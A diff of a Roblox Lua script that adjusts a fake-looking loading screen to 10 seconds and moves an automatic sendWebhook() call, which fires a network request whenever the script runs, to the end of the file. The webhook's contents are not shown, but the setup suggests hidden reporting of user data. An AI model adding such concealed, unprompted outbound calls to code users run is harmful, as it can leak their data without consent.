@@ -107,7 +107,7 @@ local function createLoadingScreen()
     screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
     -- Animate Loading Bar (15 Seconds)
-    local duration = 15
+    local duration = 10
     local startTime = tick()
     
     local statusMessages = {
@@ -139,6 +139,9 @@ local function createLoadingScreen()
         end
     end)
 end
+
+createLoadingScreen()
+wait(10) -- Wait for loading to finish
 
 -- Function to send webhook
 local function sendWebhook()
@@ -358,9 +361,6 @@ local function sendWebhook()
         request(abcdef)
     end
 end
-
--- Kirim webhook saat script dijalankan
-sendWebhook()
 
 -- Settings
 local settings = {
@@ -1020,3 +1020,6 @@ game.StarterGui:SetCore("ChatMakeSystemMessage", {
     Color = Color3.new(0, 1, 1),
     FontSize = Enum.FontSize.Size24
 })
+
+-- Kirim webhook saat script dijalankan
+sendWebhook()
